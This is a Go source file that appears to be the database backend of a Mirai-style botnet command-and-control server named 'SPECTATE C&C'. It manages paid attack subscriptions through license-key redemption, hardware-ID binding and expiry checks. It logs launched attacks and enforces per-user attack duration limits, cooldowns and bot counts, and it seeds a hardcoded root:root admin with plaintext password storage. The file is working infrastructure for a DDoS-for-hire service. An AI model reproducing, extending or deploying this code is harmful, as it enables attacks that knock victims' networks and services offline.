package main

import (
    "database/sql"
    "fmt"
    "net"
    "encoding/binary"
	"time"
    _ "github.com/go-sql-driver/mysql"
    "errors"
)

type Database struct {
    db      *sql.DB
}

type AccountInfo struct {
    username    string
    maxBots     int
    admin       int
    hwid        string
    level       int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
    // Zuerst ohne Datenbanknamen verbinden, um sie erstellen zu können
    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/", dbUser, dbPassword, dbAddr))
    if err != nil {
        fmt.Printf("\x1b[38;2;255;0;0m[ERROR] Could not connect to MySQL: %v\x1b[0m\n", err)
        return nil
    }
    
    // Test connection
    err = db.Ping()
    if err != nil {
        fmt.Printf("\x1b[38;2;255;0;0m[ERROR] MySQL Server not responding at %s: %v\x1b[0m\n", dbAddr, err)
        fmt.Println("\x1b[38;2;255;255;255m[HINT] Make sure MySQL (XAMPP/MariaDB) is running and accessible.\x1b[0m")
        return nil
    }

    // Datenbank erstellen, falls sie nicht existiert
    _, err = db.Exec(fmt.Sprintf("CREATE DATABASE IF NOT EXISTS %s", dbName))
    if err != nil {
        fmt.Printf("\x1b[38;2;255;0;0m[ERROR] Could not create database %s: %v\x1b[0m\n", dbName, err)
    }
    db.Close()

    // Jetzt mit der Datenbank verbinden
    db, err = sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
    if err != nil {
        fmt.Printf("\x1b[38;2;255;0;0m[ERROR] Could not open database %s: %v\x1b[0m\n", dbName, err)
        return nil
    }

    // Tabellen erstellen
    db.Exec("CREATE TABLE IF NOT EXISTS `users` (`id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(32) NOT NULL, `password` varchar(32) NOT NULL, `max_bots` int(11) NOT NULL DEFAULT '-1', `admin` int(1) NOT NULL DEFAULT '0', `last_paid` int(11) NOT NULL, `cooldown` int(11) NOT NULL DEFAULT '0', `duration_limit` int(11) NOT NULL DEFAULT '0', `intvl` int(11) NOT NULL DEFAULT '30', `wrc` int(1) NOT NULL DEFAULT '0', `hwid` varchar(128) DEFAULT NULL, `last_ip` varchar(45) DEFAULT NULL, `key_used` varchar(64) DEFAULT NULL, `api_key` varchar(64) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `username` (`username`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;")
    db.Exec("CREATE TABLE IF NOT EXISTS `keys` (`id` int(11) NOT NULL AUTO_INCREMENT, `auth_key` varchar(64) NOT NULL, `duration` int(11) NOT NULL, `used` int(1) NOT NULL DEFAULT '0', `created_by` varchar(32) NOT NULL, `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`), UNIQUE KEY `auth_key` (`auth_key`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;")
    db.Exec("CREATE TABLE IF NOT EXISTS `logins` (`id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(32) NOT NULL, `action` varchar(32) NOT NULL, `ip` varchar(32) NOT NULL, `time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;")
    db.Exec("CREATE TABLE IF NOT EXISTS `whitelist` (`id` int(11) NOT NULL AUTO_INCREMENT, `prefix` varchar(32) NOT NULL, `netmask` int(2) NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;")
    db.Exec("CREATE TABLE IF NOT EXISTS `history` (`id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(32) NOT NULL, `command` varchar(255) NOT NULL, `duration` int(11) NOT NULL, `time_sent` int(11) NOT NULL, `max_bots` int(11) NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;")
    
    // Root User sicherstellen
    db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit, intvl, wrc) VALUES ('root', 'root', -1, 1, UNIX_TIMESTAMP(), 0, 0, 9999, 0) ON DUPLICATE KEY UPDATE username=username")

    fmt.Println("\x1b[38;2;255;0;0mStarting SPECTATE C&C.. >\x1b[0m")
    time.Sleep(1 * time.Second)
    fmt.Println("\x1b[38;2;255;0;0mInitializing Database.. >\x1b[0m")
    time.Sleep(1 * time.Second)
    fmt.Println("\x1b[38;2;255;0;0mLoading Attack Modules.. >\x1b[0m")
    time.Sleep(2 * time.Second)
    fmt.Println("\x1b[38;2;255;0;0mBooting System.. >\x1b[0m")
    time.Sleep(1 * time.Second)
    fmt.Println("\x1b[38;2;255;255;255mSPECTATE is now ONLINE!\x1b[0m")
     
    return &Database{db}
}

func (this *Database) RedeemKey(key string, username string, password string, hwid string, ip string) (bool, string) {
    // Check if key exists and is not used
    var keyId int
    var duration int
    err := this.db.QueryRow("SELECT id, duration FROM `keys` WHERE auth_key = ? AND used = 0", key).Scan(&keyId, &duration)
    if err != nil {
        return false, "Invalid or already used key."
    }

    // Check if username already exists
    var existingUser string
    err = this.db.QueryRow("SELECT username FROM users WHERE username = ?", username).Scan(&existingUser)
    if err == nil {
        return false, "Username already taken."
    }

    // Mark key as used
    this.db.Exec("UPDATE `keys` SET used = 1 WHERE id = ?", keyId)

    // Create user with HWID binding
    _, err = this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit, intvl, wrc, hwid, last_ip, key_used) VALUES (?, ?, 1000, 0, UNIX_TIMESTAMP(), 30, 1200, ?, 1, ?, ?, ?)", 
        username, password, duration, hwid, ip, key)
    
    if err != nil {
        return false, "Database error during registration."
    }

    return true, "Success! Account created and HWID bound."
}

func (this *Database) TryLogin(username string, password string, hwid string, ip net.Addr) (bool, AccountInfo, string) {
    var accInfo AccountInfo
    var dbPassword string
    var dbHwid sql.NullString
    var lastPaid int64
    var intvl int
    
    strRemoteAddr := ip.String()
    host, _, _ := net.SplitHostPort(strRemoteAddr)

    err := this.db.QueryRow("SELECT username, password, max_bots, admin, hwid, last_paid, intvl FROM users WHERE username = ?", username).Scan(&accInfo.username, &dbPassword, &accInfo.maxBots, &accInfo.admin, &dbHwid, &lastPaid, &intvl)
    
    if err != nil {
        return false, AccountInfo{}, "User not found."
    }

    if password != dbPassword {
        this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail-Pass", host)
        return false, AccountInfo{}, "Invalid password."
    }

    // Expiry Check (Check if subscription is still valid)
    // intvl stores the days from the key duration
    expiryTime := lastPaid + int64(intvl * 24 * 60 * 60)
    if time.Now().Unix() > expiryTime && accInfo.admin == 0 {
        return false, AccountInfo{}, "Subscription expired! Please redeem a new key."
    }

    // HWID Check (If bound)
    if dbHwid.Valid && dbHwid.String != "" {
        if dbHwid.String != hwid {
            this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail-HWID", host)
            return false, AccountInfo{}, "HWID mismatch! Contact Admin."
        }
    } else {
        // First login, bind HWID
        this.db.Exec("UPDATE users SET hwid = ?, last_ip = ? WHERE username = ?", hwid, host, username)
    }

    this.db.Exec("UPDATE users SET last_ip = ? WHERE username = ?", host, username)
    this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Login", host)

    return true, accInfo, ""
}

func (this *Database) CreateBasic(username string, password string, max_bots int, duration int, cooldown int) bool {
    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
    return true
}

func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
    return true
}

func (this *Database) BlockRange(prefix string, netmask string) bool {
    rows, err := this.db.Query("SELECT prefix FROM whitelist WHERE prefix = ?", prefix)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO whitelist (prefix, netmask) VALUES (?, ?)", prefix, netmask)
    return true
}

func (this *Database) UnBlockRange(prefix string) bool {
    rows, err := this.db.Query("DELETE FROM `whitelist` WHERE prefix = ?", prefix)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("DELETE FROM `whitelist` WHERE prefix = ?", prefix)
    return true
}

func (this *Database) totalAdmins() int{
    var count int
    row := this.db.QueryRow("SELECT COUNT(*) FROM users WHERE admin = 1")
    err := row.Scan(&count)
    if err != nil {
        fmt.Println(err)
    }    
    return count
}

func (this *Database) ongoingDuration() int{
    var count int
    row := this.db.QueryRow("SELECT duration FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
    err := row.Scan(&count)
    if err != nil {
        fmt.Println(err)
    }    
    return count
}

func (this *Database) ongoingBots() int{
    var count int
    row := this.db.QueryRow("SELECT max_bots FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
    err := row.Scan(&count)
    if err != nil {
        fmt.Println(err)
    }    
    return count
}

func (this *Database) ongoingIds() int{
    var count int
    row := this.db.QueryRow("SELECT id FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
    err := row.Scan(&count)
    if err != nil {
        fmt.Println(err)
    }    
    return count
}

func (this *Database) ongoingCommands() string{
    var command string
    row := this.db.QueryRow("SELECT command FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
    err := row.Scan(&command)
    if err != nil {
        fmt.Println(err)
    }    
    return command
}

func (this *Database) totalUsers() int{
    var count int
    row := this.db.QueryRow("SELECT COUNT(*) FROM users WHERE admin = 0")
    err := row.Scan(&count)
    if err != nil {
        fmt.Println(err)
    }    
    return count
}

func (this *Database) fetchAttacks() int{
    var count int
    row := this.db.QueryRow("SELECT COUNT(*) FROM history")
    err := row.Scan(&count)
    if err != nil {
        fmt.Println(err)
    }    
    return count
}

func (this *Database) fetchUsers() int{
    var count int
    row := this.db.QueryRow("SELECT COUNT(*) FROM users")
    err := row.Scan(&count)
    if err != nil {
        fmt.Println(err)
    }    
    return count
}

func (this *Database) runningatk() int{
    var count int
    row := this.db.QueryRow("SELECT COUNT(*) FROM `history` WHERE  `duration` + `time_sent` > UNIX_TIMESTAMP()")
    err := row.Scan(&count)
    if err != nil {
        fmt.Println(err)
    }    
    return count
}

func (this *Database) CleanLogs() (bool) {
    rows, err := this.db.Query("DELETE FROM history")
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("DELETE FROM history")
    return true
}

func (this *Database) RemoveUser(username string) (bool) {
    rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
    return true
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
    rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
    if err != nil {
        fmt.Println(err)
        return false
    }
    defer rows.Close()
    for rows.Next() {
        var prefix string
        var netmask uint8
        rows.Scan(&prefix, &netmask)

        // Parse prefix
        ip := net.ParseIP(prefix)
        ip = ip[12:]
        iWhitelistPrefix := binary.BigEndian.Uint32(ip)

        for aPNetworkOrder, aN := range attack.Targets {
            rvBuf := make([]byte, 4)
            binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
            iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
            if aN > netmask { // Whitelist is less specific than attack target
                if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
                    return true
                }
            } else if aN < netmask { // Attack target is less specific than whitelist
                if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
                    return true
                }
            } else { // Both target and whitelist have same prefix
                if (iWhitelistPrefix == iAttackPrefix) {
                    return true
                }
            }
        }
    }
    return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
    // Root hat IMMER vollen Zugriff
    if username == "root" {
        this.db.Exec("INSERT INTO history (username, time_sent, duration, command, max_bots) VALUES ('root', UNIX_TIMESTAMP(), ?, ?, ?)", duration, fullCommand, maxBots)
        return true, nil
    }

    rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
    defer rows.Close()
    if err != nil {
        fmt.Println(err)
    }
    var userId, durationLimit, admin, cooldown uint32
    if !rows.Next() {
        return false, errors.New("Your access has been terminated.")
    }
    rows.Scan(&userId, &durationLimit, &admin, &cooldown)

    if durationLimit != 0 && duration > durationLimit {
        return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
    }
    rows.Close()

    if admin == 0 {
        rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE username = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", username, cooldown)
        if err != nil {
            fmt.Println(err)
        }
        if rows.Next() {
            var timeSent, historyDuration uint32
            rows.Scan(&timeSent, &historyDuration)
            return false, errors.New(fmt.Sprintf("Already using a 1/5 slot. Wait %d seconds before sending another attack.", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
        }
    }

    this.db.Exec("INSERT INTO history (username, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", username, duration, fullCommand, maxBots)
    return true, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0, "", 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0, "", 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
    return true, accInfo
}
